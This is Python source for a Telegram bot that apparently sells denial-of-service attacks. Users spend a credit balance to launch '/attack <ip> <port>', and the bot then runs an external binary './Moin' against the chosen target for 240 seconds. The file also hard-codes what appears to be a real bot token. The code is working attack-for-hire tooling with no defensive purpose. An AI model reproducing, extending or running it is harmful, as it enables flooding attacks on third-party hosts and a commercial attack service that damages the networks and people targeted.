import os
import asyncio
import json
import ipaddress
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackContext, filters
)

# --- Bot Configurations ---
TELEGRAM_BOT_TOKEN = '7715609687:AAGNIrmJ1QgpsFWHqLuXG31ZuRGmfV3UEFM'  # Replace with your actual bot token
ALLOWED_USER_ID = 7442822303  # Admin user ID
bot_access_free = True  # Set to True to make the bot free for all users
MIN_BALANCE = 1  # Minimum balance required for an attack
DEFAULT_DURATION = 240  # Default attack duration in seconds
USER_DATA_FILE = "user.json"  # File to store user balances

# --- Utility Functions for User Data ---
def load_user_balances():
    """Load user balances from the JSON file."""
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, 'r') as file:
            return json.load(file)
    return {}

def save_user_balances():
    """Save user balances to the JSON file."""
    with open(USER_DATA_FILE, 'w') as file:
        json.dump(user_balances, file, indent=4)

# Initialize user balances
user_balances = load_user_balances()

def is_valid_ip(ip):
    """Validate IP address."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_valid_port(port):
    """Validate port number."""
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False


# --- Command: /start ---
async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*😈 𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙋𝙍𝙄𝙈𝙄𝙐𝙈 𝙐𝙎𝙀𝙍 😈*\n\n"
        "✨ - `/attack <ip> <port>`\n"
        "✨ - `/balance` to check your balance\n"
        "✨ - Admins can use `/addbalance <user_id> <amount>`"
    )

    # Keyboard Buttons
    keyboard = [
        ["💰 CHECK BALANCE"],
        ["🚀 ATTACK"],
        ["💵 ADD BALANCE"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)

    await context.bot.send_message(chat_id=chat_id, text=message, reply_markup=reply_markup, parse_mode='Markdown')


# --- Handler for Button Inputs ---
async def handle_buttons(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    if text == "💰 CHECK BALANCE":
        await check_balance(update, context)
    elif text == "🚀 ATTACK":
        await context.bot.send_message(chat_id=chat_id, text="*🚀 𝙐𝙎𝙀 /attack <ip> <port>*", parse_mode='Markdown')
    elif text == "💵 ADD BALANCE":
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘼𝘿𝘿 /addbalance <user_id> <amount>*", parse_mode='Markdown')


# --- Command: /balance ---
async def check_balance(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    balance = user_balances.get(user_id, 0)
    await context.bot.send_message(chat_id=chat_id, text=f"*💰 𝙔𝙊𝙐𝙍 𝘽𝘼𝙇𝘼𝙉𝘾𝙀-> {balance}*", parse_mode='Markdown')


# --- Admin Command: /addbalance ---
async def add_balance(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝙉𝙊 𝘽𝘼𝙇𝘼𝙉𝘾𝙀 ❌*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝙐𝙎𝘼𝙂𝙀-> /addbalance <user_id> <amount>*", parse_mode='Markdown')
        return

    try:
        target_user_id = str(int(args[0]))
        amount = int(args[1])

        if amount <= 0:
            raise ValueError("Amount must be positive.")

        user_balances[target_user_id] = user_balances.get(target_user_id, 0) + amount
        save_user_balances()  # Save updated balances to file
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ 𝘼𝘿𝘿 {amount} {target_user_id}*", parse_mode='Markdown')

    except ValueError:
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝙐𝙎𝙀𝙍 𝙄𝘿 ❌*", parse_mode='Markdown')


# --- Function: Run Attack ---
async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Moin {ip} {port} {duration} 12345",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*📵 𝘼𝙏𝙏𝘼𝘾𝙆 𝙀𝙍𝙍𝙊𝙍 {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝘾𝙊𝙈𝙋𝙇𝙀𝙏𝙀\n✅ 𝙵𝙴𝙴𝙳𝙱𝙰𝙲𝙺 𝚂𝙴𝙽𝙳*", parse_mode='Markdown')


# --- Command: /attack ---
async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)

    if user_id != str(ALLOWED_USER_ID) and not bot_access_free:
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝙉𝙊 𝘽𝘼𝙇𝘼𝙉𝘾𝙀 ❌*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*🚀 𝙐𝙎𝘼𝙂𝙀-> /attack <ip> <port>*", parse_mode='Markdown')
        return

    ip, port = args

    if not is_valid_ip(ip):
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝙄𝙋 ❌*", parse_mode='Markdown')
        return

    if not is_valid_port(port):
        await context.bot.send_message(chat_id=chat_id, text="*❌ 𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝙄𝙋 ❌*", parse_mode='Markdown')
        return

    balance = user_balances.get(user_id, 0)
    if balance < MIN_BALANCE:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ 𝙈𝙄𝙉𝙄𝙈𝙐𝙈 𝘽𝘼𝙇𝘼𝙉𝘾𝙀 {MIN_BALANCE} ❌*", parse_mode='Markdown')
        return

    # Deduct balance and launch attack
    user_balances[user_id] -= MIN_BALANCE
    save_user_balances()  # Save updated balances to file
    await context.bot.send_message(chat_id=chat_id, text=(
        f"*🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏 🚀*\n\n"
        f"*💣 𝙃𝙊𝙎𝙏 -> {ip}*\n"
        f"*🎯 𝙋𝙊𝙍𝙏 -> {port}*\n"
        f"*🕛 𝙏𝙄𝙈𝙀 -> {DEFAULT_DURATION}*\n"
    ), parse_mode='Markdown')

    asyncio.create_task(run_attack(chat_id, ip, port, DEFAULT_DURATION, context))


# --- Main Function ---
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("balance", check_balance))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("addbalance", add_balance))

    # Message Handler for Buttons
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons))

    # Run the bot
    print("Moin is running...")
    application.run_polling()


if __name__ == '__main__':
    main()